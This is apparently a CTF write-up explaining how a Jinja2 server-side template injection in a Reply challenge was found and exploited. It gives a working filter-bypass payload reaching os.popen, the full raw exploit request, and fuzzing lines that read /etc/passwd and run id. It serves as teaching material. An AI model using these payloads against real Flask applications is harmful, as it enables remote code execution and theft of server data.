- 2020-10-23
- Reply CTF: Server Side Template Injection

# Prelude

This a 200 point web challenge as part of a Jepordy style CTF event hosted by [Reply](https://challenges.reply.com/). This post discusses how a sever side template injection vulnerability was identified then exploited while bypassing a filter.

## TL;DR

Webpage consisted of a HTML form to decrypt input using a symmetric cipher. If an encoded Jinja2 template was decoded, the template was executed server-side. A filter was present which banned all Python operators, built-in functions, and keywords as well as Jinja2 built-in functions/globals which was bypassed using escaped strings to access request arguments to include banned tokens. By working around the filter it was possible to produce a payload (decoded):

```py
{% raw %}
{{((((((((request|attr('a\x70\x70lication'))|attr((request|attr('f\x6frm'))['a\x72gs']))[(
request|attr('f\x6frm'))['a\x72gs2']])[(request|attr('f\x6frm'))['a\x72gs3']])((request|at
tr('f\x6frm'))['a\x72gs4']))|attr((request|attr('f\x6frm'))['a\x72gs5']))((request|attr('f
\x6frm'))['a\x72gs6']))|attr((request|attr('f\x6frm'))['a\x72gs7']))()}}
{% endraw %}

# which is equivalent to

getattr(getattr(getattr(request.application, "__globals__")["__builtins__"]["__import__"](
"os"), "popen")("cat flag/flag.txt"), "read")()

# which is equivalent to

import os;
os.popen("cat flag/flag.txt").read()
```

# Start

The webpage consists of a HTML form and two `textarea`'s for input and output; below is an image.

![webpage](web/assets/reply_web200.png)

Inspecting the page source uncovers a comment.

```html
{% raw %}
<!-- Created by P0n0 -->
{% endraw %}
```

Wasting half an hour trying to find "P0n0" using OSINT made it clear this was a waste of time. Focusing on the webpage, the webpage itself would: allow a user to input ciphertext, send the form to the webserver, then the server would place the plaintext into the adjacent `textarea`. It was discovered that the cipher being used was symmetric (though the identity of the cipher was unknown).

| Ciphertext | | Plaintext |
--- | | ---
this is a test | : | E9:D :D 2 E6DE
E9:D :D 2 E6DE | : | this is a test

A web-browser became limiting once the user facing aspects of the page were investigated, [BurpSuite](https://portswigger.net/burp) became useful to log, inspect, and modify requests made to the webserver. The requests to decrypt data were generic HTTP POST requests with form data which included a `cipher` field.

![BurpSuite](web/assets/reply_web200_burp.png)

There were several possibilities at this point depending on the programming language/environment being used by the webserver:
- [Type Juggling](https://www.youtube.com/watch?v=ASYuK01H3Po) (PHP)
- [Buffer Overflow](https://www.cloudflare.com/learning/security/threats/buffer-overflow/) (C, C++, etc.)
- Miscellaneous exploitation (e.g. inserting `NUL` characters into the ciphertext).

## Fuzzing

SSTI was not considered at this point because the webpage did not look immediately exploitatable. Type Juggling and Buffer Overflows were not possible which left Miscellaneous exploitation. A few hand written payloads were attempted before BurpSuite's [Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder) feature was utilised. The intruder feature allowed for automatic fuzzing of the `cipher` parater using a generic webapp wordlist (a sample is listed below).

```
%0Acat%20/etc/passwd
%0Aid
%0a id %0a
%0Aid%0A
%0a ping -i 30 127.0.0.1 %0a
%0A/usr/bin/id
%0A/usr/bin/id%0A
```

![Sniper output](web/assets/reply_web200_sniper.png)

Looking at the sizes of the responses we see that two payloads had a significantly smaller page size which suggested there was an error during processing, sending this request in burp we see this for ourselves.

```
' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
```

![Internal error](web/assets/reply_web200_error.png)

While disecting the above payloads we discovered "LL" would break the server, decrypting this gave {% raw %} {{ {% endraw %} which immediately meant this was an SSTI vulnerability.

# SSTI

Knowing it was SSTI was due to knowing the templating engine [Jinja2](https://jinja.palletsprojects.com/en/2.11.x/) (used by [Flask](https://flask.palletsprojects.com/en/1.1.x/)) uses {% raw %} {{ {% endraw %} for marking the start of templates. The next step was to look at the Jinja2 documentation to see how a request can be crafted to access information on the webserver. The documentation mentioned that there are specific [global varaibles](https://jinja.palletsprojects.com/en/2.11.x/api/#global-namespace) available within templates, inspecting this on a local machine saw that the Flask [`request`](https://werkzeug.palletsprojects.com/en/1.0.x/wrappers/#werkzeug.wrappers.BaseRequest) object and [`config`](https://flask.palletsprojects.com/en/1.1.x/api/#configuration) object was available. To learn more about the webserver, the payload {% raw %} {{config}} {% endraw %} was encoded then decoded.

![Flask configuration](web/assets/reply_web200_config.png)

There is an entry: `'SECRET_KEY': '}FLG:ThisIsTheRightFlag!{'` which is a false flag (literally), we have to exploit the webserver. To do this, we successively modify the below script until we can encode then execute it on the server.

```py
import os
os.popen("cmd").read()
```

We can only execute single statements within the template because `;` is escaped - there is a filter. Consequently, we have to inline the payload. To achieve this we use the underlying function [`__import__`](https://docs.python.org/3/library/functions.html#__import__) facilitating the `import` keyword.

```py
__import__("os").os.open("cmd").read()
```

`__import__` is filtered.

![filter](web/assets/reply_web200_filter.png)

To indirectly reference `__import__` we can access it through [`__builtins__`](https://docs.python.org/3/library/builtins.html) (a value containing all built-in objects) using `getattr` (the function invoked for the `.` operator).

```py
__builtins__["__import__"]("os").open("cmd").read()
```

`__builtins__` is also filtered which presents a new problem since there is no way to indirectly access `__builtins__` from an arbitrary namespace. However, Flask has an [`application`](https://flask.palletsprojects.com/en/1.1.x/api/#flask.Request.application) object accessible from the `request` object which represents the Flask application and includes the application's **namespace**. We cannot refer to the object `__builtins__` so we need to access by referencing it as a string, this is achieveable with [`__getitem__`](https://docs.python.org/3/reference/datamodel.html#object.__getitem__) which is the underlying function for the `[]` operator (we use the high-level syntax for reasons made clear later).

```py
getattr(request.application, "__builtins__")["__import__"]("os").open("cmd").read()
```

`getattr` and `.` are filtered which presents another problem because there is no way to access the atttribute of an object in Python without using either or these. However, Jinja2 has [built-in](https://jinja.palletsprojects.com/en/2.11.x/templates/#list-of-builtin-filters) functions for templates accessible from Python. One such function is [`attr`](https://jinja.palletsprojects.com/en/2.11.x/templates/#attr) which can get the attribute of an object using the `|` operator (the `attr` function itself is filtered).

```py
(((((request|attr("application"))|attr("__builtins__"))["__import__"]("os")|attr("open"))|
attr("cmd"))|attr("read"))()
```

`"application"` is filtered and there is _no other way_ to get the `application` object a better understanding of the filter is required. The filter likely considers each character individually prior to substitution so we can potentially escape characters which passes a static evaluation but is evaluated as the correct value at runtime. To save time, all Python operators are filtered as well as implicit string literal concetenation (e.g. `"a" "b" == "ab"`). Hex encoding can split a character from a static perspective: `"application" == "a\x70\x70lication"`.

```py
(((((request|attr('a\x70\x70lication'))|attr("__builtins__"))["__import__"]("os")|attr("op
en"))|attr("cmd"))|attr("read"))()
```

Double quotes are filtered along with a subset of strings using apostrophes. To combat this, additional arguments can be provided in the request which contain the filtered tokens which can be substituted into the payload (bypassing static analysis). The arguments can be accessed using `request.application.form.<ARGUENT>`.

```py
((((((((request|attr('a\x70\x70lication'))|attr((request|attr('f\x6frm'))['a\x72gs']))[(re
quest|attr('f\x6frm'))['a\x72gs2']])[(request|attr('f\x6frm'))['a\x72gs3']])((request|attr
('f\x6frm'))['a\x72gs4']))|attr((request|attr('f\x6frm'))['a\x72gs5']))((request|attr('f\x
6frm'))['a\x72gs6']))|attr((request|attr('f\x6frm'))['a\x72gs7']))()
```

(`"form"` and `"args"` is escaped, hence the hex encoding). The request arguments contain the strings above in order for the request to succeed. Putting this payload into Burp then sending it yields:

![flag](web/assets/reply_web200_flag.png)

The raw request is listed below:

```
POST /0b7d3eb5b7973d27ec3adaffd887d0e2/ HTTP/1.1
Host: gamebox1.reply.it
Content-Length: 1144
Origin: http://gamebox1.reply.it
Content-Type: application/x-www-form-urlencoded

cipher=%4c%4c%57%57%57%57%57%57%57%57%43%36%42%46%36%44%45%4d%32%45%45%43%57%56%32%2d%49
%66%5f%2d%49%66%5f%3d%3a%34%32%45%3a%40%3f%56%58%58%4d%32%45%45%43%57%57%43%36%42%46%36%44
%45%4d%32%45%45%43%57%56%37%2d%49%65%37%43%3e%56%58%58%2c%56%32%2d%49%66%61%38%44%56%2e%58
%58%2c%57%43%36%42%46%36%44%45%4d%32%45%45%43%57%56%37%2d%49%65%37%43%3e%56%58%58%2c%56%32
%2d%49%66%61%38%44%61%56%2e%2e%58%2c%57%43%36%42%46%36%44%45%4d%32%45%45%43%57%56%37%2d%49
%65%37%43%3e%56%58%58%2c%56%32%2d%49%66%61%38%44%62%56%2e%2e%58%57%57%43%36%42%46%36%44%45
%4d%32%45%45%43%57%56%37%2d%49%65%37%43%3e%56%58%58%2c%56%32%2d%49%66%61%38%44%63%56%2e%58
%58%4d%32%45%45%43%57%57%43%36%42%46%36%44%45%4d%32%45%45%43%57%56%37%2d%49%65%37%43%3e%56
%58%58%2c%56%32%2d%49%66%61%38%44%64%56%2e%58%58%57%57%43%36%42%46%36%44%45%4d%32%45%45%43
%57%56%37%2d%49%65%37%43%3e%56%58%58%2c%56%32%2d%49%66%61%38%44%65%56%2e%58%58%4d%32%45%45
%43%57%57%43%36%42%46%36%44%45%4d%32%45%45%43%57%56%37%2d%49%65%37%43%3e%56%58%58%2c%56%32
%2d%49%66%61%38%44%66%56%2e%58%58%57%58%4e%4e&args=__globals__&args2=__builtins__&args3=__
import__&args4=os&args5=popen&args6=cat%20flag/flag.txt&args7=read
```
